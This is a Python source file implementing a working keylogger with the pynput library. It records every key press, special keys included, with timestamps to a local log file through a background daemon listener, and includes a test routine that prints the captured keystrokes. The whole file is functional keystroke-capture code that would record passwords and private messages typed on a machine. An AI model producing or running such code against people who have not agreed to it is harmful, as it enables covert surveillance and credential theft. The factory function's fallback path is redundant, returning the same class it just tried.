import os
import threading
import time
import json
from datetime import datetime

from pynput import keyboard


class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_buffer = []
        self.is_running = False
        self.thread = None
        
        # Ensure log file exists
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w') as f:
                f.write("Keylogger started at {0}\n".format(datetime.now()))
                f.write("=" * 50 + "\n")
    
    def log_keystroke(self, key_data):
        """Log keystroke to buffer and file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = "[{0}] {1}\n".format(timestamp, key_data)
        
        # Add to buffer
        self.log_buffer.append(log_entry)
        
        # Write to file
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
                f.flush()
        except Exception as e:
            print("Error writing to log file: {0}".format(e))
    
    def log_window_change(self, title):
        """Log when user switches to a different window"""
        self.log_keystroke("--- WINDOW CHANGED: {0} ---".format(title))


class UnifiedKeyLogger(KeyLogger):
    """Unified keylogger using pynput"""
    
    def __init__(self, log_file="keylog.txt"):
        super().__init__(log_file)
        self.listener = None
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            # Handle different key types
            if hasattr(key, 'char') and key.char:
                # Regular alphanumeric keys
                self.log_keystroke(key.char)
            else:
                # Special keys
                key_name = self.format_special_key(key)
                self.log_keystroke("[{0}]".format(key_name))
                
        except Exception as e:
            self.log_keystroke("[ERROR: {0}]".format(str(e)))
    
    def on_release(self, key):
        """Handle key release events"""
        # Can be used for tracking key combinations or states
        pass
    
    def format_special_key(self, key):
        """Format special keys for logging"""
        key_map = {
            keyboard.Key.enter: 'ENTER',
            keyboard.Key.tab: 'TAB',
            keyboard.Key.space: 'SPACE',
            keyboard.Key.backspace: 'BACKSPACE',
            keyboard.Key.delete: 'DELETE',
            keyboard.Key.home: 'HOME',
            keyboard.Key.end: 'END',
            keyboard.Key.page_up: 'PAGE_UP',
            keyboard.Key.page_down: 'PAGE_DOWN',
            keyboard.Key.up: 'UP_ARROW',
            keyboard.Key.down: 'DOWN_ARROW',
            keyboard.Key.left: 'LEFT_ARROW',
            keyboard.Key.right: 'RIGHT_ARROW',
            keyboard.Key.esc: 'ESC',
            keyboard.Key.f1: 'F1', keyboard.Key.f2: 'F2', keyboard.Key.f3: 'F3', 
            keyboard.Key.f4: 'F4', keyboard.Key.f5: 'F5', keyboard.Key.f6: 'F6',
            keyboard.Key.f7: 'F7', keyboard.Key.f8: 'F8', keyboard.Key.f9: 'F9',
            keyboard.Key.f10: 'F10', keyboard.Key.f11: 'F11', keyboard.Key.f12: 'F12',
            keyboard.Key.ctrl_l: 'CTRL_L', keyboard.Key.ctrl_r: 'CTRL_R',
            keyboard.Key.alt_l: 'ALT_L', keyboard.Key.alt_r: 'ALT_R',
            keyboard.Key.cmd: 'WIN', keyboard.Key.cmd_r: 'WIN_R',
            keyboard.Key.caps_lock: 'CAPS_LOCK',
            keyboard.Key.num_lock: 'NUM_LOCK',
            keyboard.Key.scroll_lock: 'SCROLL_LOCK',
            keyboard.Key.insert: 'INSERT',
            keyboard.Key.print_screen: 'PRINT_SCREEN',
            keyboard.Key.pause: 'PAUSE',
            keyboard.Key.shift: 'SHIFT',
            keyboard.Key.shift_r: 'SHIFT_R'
        }
        
        return key_map.get(key, str(key).replace('Key.', '').upper())
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return False
        
        self.is_running = True
        self.log_keystroke("=== KEYLOGGER STARTED ===")
        
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.daemon = True
            self.listener.start()
            return True
        except Exception as e:
            self.log_keystroke("[KEYLOGGER START ERROR: {0}]".format(str(e)))
            return False
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return False
        
        self.is_running = False
        self.log_keystroke("=== KEYLOGGER STOPPED ===")
        
        try:
            if self.listener:
                self.listener.stop()
        except:
            pass
        
        return True


def create_keylogger(log_file="keylog.txt"):
    """Factory function to create appropriate keylogger"""
    try:
        return UnifiedKeyLogger(log_file)
    except Exception:
        # Fallback to basic cross-platform version
        return UnifiedKeyLogger(log_file)


# Test the keylogger (for standalone testing)
if __name__ == "__main__":
    print("Testing keylogger...")
    keylogger = create_keylogger("test_keylog.txt")
    
    if keylogger.start():
        print("Keylogger started. Type something and press Ctrl+C to stop...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            keylogger.stop()
            print("\nKeylogger stopped.")
            
            # Show logged keys
            try:
                with open("test_keylog.txt", 'r') as f:
                    print("\nLogged keystrokes:")
                    print(f.read())
            except:
                print("Could not read log file.")
    else:
        print("Failed to start keylogger.")